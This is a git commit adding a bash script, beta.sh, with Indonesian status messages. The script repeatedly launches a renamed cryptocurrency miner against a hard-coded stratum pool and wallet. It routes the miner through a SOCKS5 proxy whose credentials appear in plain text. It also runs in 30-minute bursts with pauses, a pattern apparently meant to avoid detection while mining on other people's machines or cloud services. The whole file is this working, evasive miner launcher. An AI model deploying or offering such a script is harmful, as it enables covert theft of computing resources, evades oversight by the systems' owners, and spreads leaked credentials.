ea34f029755035d1a783d8efa3ec5a002567f7c8
bintangming55-max <bintangming55@gmail.com>
2025-11-23 12:07:02 +0700

    Create beta.sh

---
+++ beta.sh
@@ -0,0 +1,31 @@
+#!/bin/bash
+
+while true; do
+    echo "Ayo OM di GASSSSSS...Ulang.sh"
+    ./cpulinu -a Yescrypt  -o stratum+tcp://51.178.76.133:4024 -u 144jRevXH8g2WNTF7vLqkYa3VZE3ydpL7f.beta -x socks5://pymiivur-rotate:o5tci5ctvvde@p.webshare.io:80 -t4 &
+    miner_pid=$!
+
+    # Counter waktu sleep 1800 detik (30 menit) dan cetak informasi setiap 10 menit
+    echo "Menunggu selama 30 menit..."
+    for ((i=1; i<=1800; i++)); do
+        sleep 1
+        if ((i % 600 == 0)); then  # Setiap 600 detik (10 menit)
+            echo "Sudah $((i / 60)) menit..."
+        fi
+    done
+
+    echo "Rehat Dulu Masbroo..."
+    kill $miner_pid
+
+    # Counter waktu sleep 180 detik (3 menit)
+    echo "Menunggu selama 3 menit..."
+    for ((i=1; i<=180; i++)); do
+        sleep 1
+        if ((i % 60 == 0)); then
+            echo "Sudah $((i / 60)) menit..."
+        fi
+    done
+
+    echo "Nungguin Ya ntar khan Jalan sendiri..."
+    sleep 180
+done
